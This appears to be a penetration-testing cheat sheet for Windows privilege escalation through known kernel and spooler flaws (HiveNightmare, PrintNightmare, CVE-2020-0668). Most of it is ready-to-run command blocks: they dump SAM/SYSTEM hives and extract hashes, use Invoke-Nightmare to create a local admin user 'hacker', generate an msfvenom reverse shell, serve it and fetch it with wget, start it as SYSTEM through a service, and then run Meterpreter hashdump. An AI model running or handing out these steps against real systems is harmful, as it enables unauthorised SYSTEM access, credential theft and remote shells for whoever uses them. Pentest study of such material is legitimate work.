# **Kernel Exploits**

## **Enumeration Commands**

```powershell
systeminfo
wmic qfe list brief
Get-Hotfix
icacls
whoami /priv
ls \\localhost\pipe\spoolss
```

---

## **Exploitation Commands**

```powershell
HiveNightmare.exe
impacket-secretsdump

Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

msfvenom
python3 -m http.server <port>
wget http://<ip>:<port>/<file>

CVE-2020-0668.exe <source> <destination>
copy /Y <source> <destination>
msfconsole -r <resource_file>

net start MozillaMaintenance
```

---

## **Verification Commands**

```powershell
net user hacker
getuid
hashdump
```

---

# **Key Concepts**

### **Kernel Exploits**

* Target vulnerabilities in the Windows kernel to escalate to SYSTEM.
* Common on legacy or poorly patched systems.

### **Notable Historical Vulns**

* **MS08-067** - Server service RCE
* **MS17-010 / EternalBlue** - SMB RCE
* **CVE-2021-36934 / HiveNightmare** - Read SAM/SYSTEM/SECURITY hives
* **CVE-2021-1675 / CVE-2021-34527 / PrintNightmare** - Spooler LPE/RCE
* **CVE-2020-0668** - Service Tracing LPE

### **Patch Management**

* Incomplete patching is the root cause of most kernel exploitability.
* Old vulnerabilities remain highly effective during pentests.

---

# **Approach, Commands, Tools, and Techniques**

## **1. Enumeration**

* `systeminfo` - OS version & hotfix baseline
* `wmic qfe`, `Get-Hotfix` - Patch inventory
* `whoami /priv` - Privilege-based escalation checks
* `icacls` - Misconfigured permissions
* `ls \\localhost\pipe\spoolss` - Spooler status (PrintNightmare indicator)

---

## **2. Exploitation**

### **HiveNightmare - CVE-2021-36934**

* Abuse world-readable SAM/SYSTEM/SECURITY backups.
* Steps:

  ```powershell
  HiveNightmare.exe
  impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
  ```

### **PrintNightmare - CVE-2021-1675 / CVE-2021-34527**

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

### **CVE-2020-0668 - Service Tracing LPE**

* Replace service-executable path to obtain SYSTEM.

Typical workflow:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > rev.exe
python3 -m http.server 80
wget http://<ip>/rev.exe
CVE-2020-0668.exe <source> <destination>
copy /Y <source> <destination>
net start MozillaMaintenance
```

---

## **3. Verification**

* Check user creation:
  ```powershell
  net user hacker
  ```
* Meterpreter verification:
  ```bash
  getuid
  hashdump
  ```
